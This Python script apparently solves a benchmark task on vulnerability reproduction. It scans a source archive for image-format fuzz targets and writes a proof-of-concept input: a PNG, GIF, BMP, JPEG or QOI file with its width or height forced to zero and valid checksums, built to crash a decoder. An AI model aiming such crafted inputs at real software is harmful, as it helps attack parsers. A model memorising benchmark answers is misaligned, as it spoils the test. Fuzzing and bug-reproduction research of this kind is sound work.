import os
import tarfile
import tempfile
import struct
import binascii
import zlib
from collections import defaultdict


PNG_SIG = b'\x89PNG\r\n\x1a\n'


def extract_src(src_path: str) -> str:
    tmp_dir = tempfile.mkdtemp(prefix="pocgen_")
    try:
        with tarfile.open(src_path, "r:*") as tf:
            tf.extractall(tmp_dir)
    except tarfile.ReadError:
        # If src_path is already a directory (unlikely, but for robustness)
        if os.path.isdir(src_path):
            return src_path
        raise
    return tmp_dir


def scan_sample_images(root: str):
    """
    Scan for small image files of known formats.
    Returns:
        samples: dict[fmt] -> path to smallest sample file
        counts: dict[fmt] -> number of files detected
    """
    format_exts = {
        "PNG": {".png"},
        "GIF": {".gif"},
        "JPEG": {".jpg", ".jpeg", ".jpe"},
        "BMP": {".bmp"},
        "QOI": {".qoi"},
    }

    samples = {}  # fmt -> (path, size)
    counts = defaultdict(int)

    max_files = 50000
    scanned = 0

    for dirpath, _, filenames in os.walk(root):
        for fname in filenames:
            if scanned >= max_files:
                break
            scanned += 1

            path = os.path.join(dirpath, fname)
            try:
                st = os.stat(path)
            except OSError:
                continue

            size = st.st_size
            # ignore extremely small or huge files
            if size < 16 or size > 5 * 1024 * 1024:
                continue

            ext = os.path.splitext(fname)[1].lower()

            # Quick filter by extension where possible
            likely_ext_match = any(ext in exts for exts in format_exts.values())

            # If no likely extension, still try but only for small files
            if not likely_ext_match and size > 256 * 1024:
                continue

            try:
                with open(path, "rb") as f:
                    header = f.read(16)
            except OSError:
                continue

            fmt = None
            if header.startswith(PNG_SIG):
                fmt = "PNG"
            elif header.startswith(b"GIF87a") or header.startswith(b"GIF89a"):
                fmt = "GIF"
            elif header.startswith(b"\xff\xd8"):
                fmt = "JPEG"
            elif header.startswith(b"BM"):
                fmt = "BMP"
            elif header.startswith(b"qoif"):
                fmt = "QOI"

            if fmt is None:
                continue

            counts[fmt] += 1
            prev = samples.get(fmt)
            if prev is None or size < prev[1]:
                samples[fmt] = (path, size)

        if scanned >= max_files:
            break

    # Convert samples mapping to fmt -> path
    samples_paths = {fmt: info[0] for fmt, info in samples.items()}
    return samples_paths, counts


def detect_format_from_fuzzers(root: str):
    """
    Try to guess primary image format from fuzz target source files.
    Returns: format string or None
    """
    format_keywords = {
        "PNG": ["png.h", "libpng", "png_create_read_struct", "png_structp", "png_infop"],
        "GIF": ["nsgif", "libnsgif", "gif_", "gif.h", "gif_anim", "gif_bitmap"],
        "BMP": ["nsbmp", "bmp_image", "bmp_", "bmp.h"],
        "JPEG": ["jpeglib.h", "libjpeg", "jpeg_decompress_struct", "turbojpeg.h", "tjDecompress"],
        "QOI": ["qoi.h", "qoif", "qoi_read", "qoi_decode", "qoi_desc"],
    }

    fmt_scores = defaultdict(int)

    for dirpath, _, filenames in os.walk(root):
        for fname in filenames:
            lname = fname.lower()
            if not lname.endswith((".c", ".cc", ".cpp", ".cxx", ".h", ".hpp")):
                continue

            path = os.path.join(dirpath, fname)
            try:
                with open(path, "r", encoding="utf-8", errors="ignore") as f:
                    text = f.read()
            except OSError:
                continue

            if "LLVMFuzzerTestOneInput" not in text:
                continue

            low = text.lower()

            # Filename-based hints
            if "gif" in lname or "nsgif" in lname:
                fmt_scores["GIF"] += 3
            if "png" in lname:
                fmt_scores["PNG"] += 3
            if "jpeg" in lname or "jpg" in lname:
                fmt_scores["JPEG"] += 3
            if "bmp" in lname:
                fmt_scores["BMP"] += 3
            if "qoi" in lname:
                fmt_scores["QOI"] += 3

            # Keyword-based hints
            for fmt, kws in format_keywords.items():
                for kw in kws:
                    if kw in low:
                        fmt_scores[fmt] += 1

    best_fmt = None
    best_score = 0
    for fmt, score in fmt_scores.items():
        if score > best_score:
            best_score = score
            best_fmt = fmt

    return best_fmt if best_score > 0 else None


def make_png_zero_dim(orig: bytes) -> bytes:
    if not orig.startswith(PNG_SIG):
        return orig
    data = orig
    offset = 8  # skip signature
    length = len(data)
    while offset + 8 <= length:
        if offset + 8 > length:
            break
        try:
            chunk_len = struct.unpack(">I", data[offset:offset + 4])[0]
        except struct.error:
            break
        ctype = data[offset + 4:offset + 8]
        data_start = offset + 8
        data_end = data_start + chunk_len
        crc_start = data_end
        crc_end = crc_start + 4
        if crc_end > length:
            break
        if ctype == b"IHDR":
            ihdr = bytearray(data[data_start:data_end])
            if len(ihdr) < 8:
                break
            orig_width = struct.unpack(">I", ihdr[0:4])[0]
            orig_height = struct.unpack(">I", ihdr[4:8])[0]

            new_ihdr = bytearray(ihdr)
            if orig_width != 0:
                new_ihdr[0:4] = b"\x00\x00\x00\x00"
            elif orig_height != 0:
                new_ihdr[4:8] = b"\x00\x00\x00\x00"
            else:
                # already zero-dimension
                return orig

            new_crc_val = binascii.crc32(b"IHDR" + new_ihdr) & 0xFFFFFFFF
            new_crc = struct.pack(">I", new_crc_val)

            return data[:data_start] + bytes(new_ihdr) + new_crc + data[crc_end:]
        offset = crc_end
    return orig


def make_gif_zero_dim(orig: bytes) -> bytes:
    if not (orig.startswith(b"GIF87a") or orig.startswith(b"GIF89a")):
        return orig
    if len(orig) < 10:
        return orig
    b = bytearray(orig)
    # Logical Screen Width at offset 6-7, little-endian
    # Set width to 0; if already zero, zero height as well
    width = b[6] | (b[7] << 8)
    if width != 0:
        b[6] = 0
        b[7] = 0
    else:
        # width already zero, set height to zero too
        if len(b) >= 12:
            b[8] = 0
            b[9] = 0
    return bytes(b)


def make_bmp_zero_dim(orig: bytes) -> bytes:
    if not orig.startswith(b"BM") or len(orig) < 26:
        return orig
    b = bytearray(orig)
    try:
        dib_header_size = struct.unpack("<I", b[14:18])[0]
    except struct.error:
        return orig
    if dib_header_size < 16 or 14 + dib_header_size > len(b):
        return orig
    # For BITMAPINFOHEADER-like, width at offset 18-21, height at 22-25
    if len(b) >= 22:
        width = struct.unpack("<i", b[18:22])[0]
        if width != 0:
            b[18:22] = b"\x00\x00\x00\x00"
        elif len(b) >= 26:
            b[22:26] = b"\x00\x00\x00\x00"
    return bytes(b)


def make_jpeg_zero_dim(orig: bytes) -> bytes:
    if not orig.startswith(b"\xff\xd8") or len(orig) < 4:
        return orig
    data = bytearray(orig)
    i = 2
    length = len(data)
    while i + 4 <= length:
        if data[i] != 0xFF:
            i += 1
            continue
        marker = data[i + 1]
        i += 2
        # Standalone markers
        if marker == 0xD9 or marker == 0xDA:
            break
        if marker == 0x01 or 0xD0 <= marker <= 0xD7:
            continue
        if i + 2 > length:
            break
        try:
            seg_len = struct.unpack(">H", data[i:i + 2])[0]
        except struct.error:
            break
        if seg_len < 2 or i + seg_len > length:
            break
        if 0xC0 <= marker <= 0xCF and marker not in (0xC4, 0xC8, 0xCC):
            # SOF marker
            if seg_len >= 8 and i + 7 < length:
                # layout: [len_hi][len_lo][P][Yhi][Ylo][Xhi][Xlo][Nf]...
                height_off = i + 3
                width_off = i + 5
                height = struct.unpack(">H", data[height_off:height_off + 2])[0]
                width = struct.unpack(">H", data[width_off:width_off + 2])[0]
                if height != 0:
                    data[height_off:height_off + 2] = b"\x00\x00"
                elif width != 0:
                    data[width_off:width_off + 2] = b"\x00\x00"
                return bytes(data)
        i += seg_len
    return orig


def make_qoi_zero_dim(orig: bytes) -> bytes:
    if not (orig.startswith(b"qoif") and len(orig) >= 14):
        return orig
    b = bytearray(orig)
    width = struct.unpack(">I", b[4:8])[0]
    if width != 0:
        b[4:8] = b"\x00\x00\x00\x00"
    else:
        height = struct.unpack(">I", b[8:12])[0]
        if height != 0:
            b[8:12] = b"\x00\x00\x00\x00"
    return bytes(b)


def build_minimal_png_zero_width() -> bytes:
    width = 0
    height = 1000  # non-zero to trigger height usage
    bit_depth = 8
    color_type = 0  # grayscale
    compression = 0
    filter_method = 0
    interlace = 0

    ihdr_data = struct.pack(">IIBBBBB", width, height, bit_depth, color_type,
                            compression, filter_method, interlace)
    ihdr_len = struct.pack(">I", len(ihdr_data))
    ihdr_type = b"IHDR"
    ihdr_crc_val = binascii.crc32(ihdr_type + ihdr_data) & 0xFFFFFFFF
    ihdr_crc = struct.pack(">I", ihdr_crc_val)
    ihdr_chunk = ihdr_len + ihdr_type + ihdr_data + ihdr_crc

    # raw scanlines: one filter byte per row for zero-width image
    raw = b"\x00" * height
    comp = zlib.compress(raw, level=9)
    idat_len = struct.pack(">I", len(comp))
    idat_type = b"IDAT"
    idat_crc_val = binascii.crc32(idat_type + comp) & 0xFFFFFFFF
    idat_crc = struct.pack(">I", idat_crc_val)
    idat_chunk = idat_len + idat_type + comp + idat_crc

    iend_len = struct.pack(">I", 0)
    iend_type = b"IEND"
    iend_crc_val = binascii.crc32(iend_type) & 0xFFFFFFFF
    iend_crc = struct.pack(">I", iend_crc_val)
    iend_chunk = iend_len + iend_type + iend_crc

    return PNG_SIG + ihdr_chunk + idat_chunk + iend_chunk


def choose_target_format(samples, counts, primary_fmt):
    # Only formats we implement
    supported = ["GIF", "PNG", "QOI", "BMP", "JPEG"]

    if primary_fmt in supported:
        # Prefer format indicated by fuzz target if we also have a sample
        if primary_fmt in samples:
            return primary_fmt
        # Otherwise still return primary_fmt (we might craft from scratch, e.g., PNG)
        return primary_fmt

    # Otherwise pick the supported format with largest count
    best_fmt = None
    best_count = -1
    for fmt in supported:
        cnt = counts.get(fmt, 0)
        if fmt in samples and cnt > best_count:
            best_count = cnt
            best_fmt = fmt

    if best_fmt:
        return best_fmt

    # Fallback: default to PNG
    return "PNG"


class Solution:
    def solve(self, src_path: str) -> bytes:
        root = extract_src(src_path)

        samples, counts = scan_sample_images(root)
        primary_fmt = detect_format_from_fuzzers(root)
        target_fmt = choose_target_format(samples, counts, primary_fmt)

        poc = None

        # Try to use a real sample from the project if available
        sample_path = samples.get(target_fmt)
        if sample_path is not None:
            try:
                with open(sample_path, "rb") as f:
                    orig = f.read()
            except OSError:
                orig = None

            if orig:
                if target_fmt == "PNG":
                    poc = make_png_zero_dim(orig)
                elif target_fmt == "GIF":
                    poc = make_gif_zero_dim(orig)
                elif target_fmt == "BMP":
                    poc = make_bmp_zero_dim(orig)
                elif target_fmt == "JPEG":
                    poc = make_jpeg_zero_dim(orig)
                elif target_fmt == "QOI":
                    poc = make_qoi_zero_dim(orig)

        # If we couldn't create from sample, fall back to crafting a minimal PNG
        if not poc:
            poc = build_minimal_png_zero_width()

        return poc
